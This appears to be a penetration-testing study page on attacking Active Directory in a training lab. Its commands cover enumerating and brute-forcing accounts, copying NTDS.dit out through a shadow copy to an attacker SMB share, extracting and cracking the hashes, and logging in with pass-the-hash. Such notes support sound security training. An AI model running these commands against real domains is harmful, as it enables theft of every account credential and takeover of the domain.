---
title: Active Directory & NTDS.dit
tags: [password-attacks, active-directory, ntds, kerbrute, netexec, evil-winrm, secretsdump, pass-the-hash, vss]
---

# Active Directory & NTDS.dit

> NTDS.dit is the primary AD database on Domain Controllers — it holds all domain account hashes. Capturing it gives you every credential in the domain.

## Dictionary Attacks Against AD Accounts

!!! warning
    Brute-forcing AD accounts is very noisy. Windows does **not** enforce lockout by default, but modern Windows 11 (22H2+) and Entra ID do. Check for lockout policy before running wordlists.

### Step 1 — Build a Username List

- Gather employee names from LinkedIn, company website, email signatures.
- Use [usernameAnarchy](https://github.com/urbanadventurer/username-anarchy) to generate username variants from names.

### Step 2 — Validate Usernames with Kerbrute

Kerbrute sends AS-REQ packets — valid usernames get a response, invalid ones don't.

```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

### Step 3 — Brute-Force with NetExec

```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

---

## Capturing NTDS.dit

NTDS.dit is located at `%systemroot%/ntds` on Domain Controllers. It's encrypted with a key stored in `SYSTEM` — you need both files.

**Requires:** Local Admin or Domain Admin rights on the DC.

### Method 1 — VSS + Evil-WinRM

```bash
# Connect to DC
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

```powershell
# Verify group membership
net localgroup
net user bwilliamson

# Create a Volume Shadow Copy of C:
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.dit from the shadow copy
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit

# Move to attacker share
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

```bash
# Extract hashes (need SYSTEM hive too)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### Method 2 — NetExec ntdsutil (Faster)

```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

---

## Cracking Domain Hashes

```bash
# NTLM (-m 1000)
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

!!! tip
    If cracking fails, move straight to **Pass the Hash** — you don't need the plaintext to authenticate with NTLM.

---

## Pass the Hash (Quick Reference)

```bash
# Evil-WinRM
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

See [pass-the-hash.md](pass-the-hash.md) for all PtH techniques.
